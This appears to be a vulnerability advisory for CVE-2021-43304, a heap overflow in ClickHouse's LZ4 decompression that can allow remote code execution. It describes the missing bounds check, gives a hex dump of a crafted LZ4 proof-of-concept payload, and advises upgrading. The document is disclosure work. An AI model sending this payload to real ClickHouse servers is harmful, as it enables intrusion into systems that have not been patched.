{"hash":"8bfbd47c755b75210ca83b1b6cb2e672e2ce3411","data":{"post":{"title":"ClickHouse LZ4 RCE","path":"/vulnerabilities/clickhouse-lz4-rce-xray-199961/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>A heap overflow in ClickHouse can allow an authenticated network attacker to perform remote code execution</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p><a href=\"https://clickhouse.com/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">ClickHouse</a></p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>ClickHouse (, 21.10.2.15), fixed in 21.10.2.15</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>There is no verification that the copy operations in the <code>LZ4::decompressImpl</code> loop and especially the arbitrary copy operation <code>wildCopy&#x3C;copy_amount>(op, ip, copy_end)</code>, don’t exceed the destination buffer’s limits. Note that the lengths of the overflow, as well as source’s allocation size and the overflowing byte contents are fully controlled by the user. Also note that specifically this size check happens after the copy operation while the other copy operations aren’t covered at all.</p>\n<p>A low-privileged authenticated network attacker can trigger this issue by sending crafted LZ4 data in a decompression request.</p>\n<p>This issue is very similar to CVE-2021-43305, but the vulnerable copy operation is in a different <code>wildCopy</code> call.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>More info in <a href=\"https://jfrog.com/blog/7-rce-and-dos-vulnerabilities-found-in-clickhouse-dbms\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">JFrog's Blogpost</a> -</p>\n<p><code>00000000 26 fc 61 db c0 83 bb 0a db 58 5a f0 34 e1 30 f6 |&#x26;.a......XZ.4.0.|</code></p>\n<p><code>00000010 82 0a c8 00 00 01 00 00 00 f0 ff ff ff ff ff ff |................|</code></p>\n<p><code>00000020 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................|</code></p>\n<p><code>*</code></p>\n<p><code>000000e0 ff ff 41 41 41 41 41 41 41 41 41 41 41 41 41 41 |..AAAAAAAAAAAAAA|</code></p>\n<p><code>000000f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 |AAAAAAAAAAAAAAAA|</code></p>\n<p><code>*</code></p>\n<p><code>0000c81a</code></p>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are provided for this vulnerability.</p>\n<p>In order to fully fix this vulnerability, we recommend upgrading ClickHouse to version 21.10.2.15.</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://jfrog.com/blog/7-rce-and-dos-vulnerabilities-found-in-clickhouse-dbms\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">(JFrog) Security Vulnerabilities Found in ClickHouse Open-Source Software</a></p>\n<p><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-43304\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">NVD</a></p>\n","description":"CVE-2021-43304 High severity. Heap overflow in ClickHouse leads to remote code execution","date_published":"2022-03-15","xray_id":"XRAY-199961","vul_id":"CVE-2021-43304","severity":"high","discovered_by":"Uriya Yavnieli","last_updated":"2022-03-15","cvss":8.8}},"context":{}}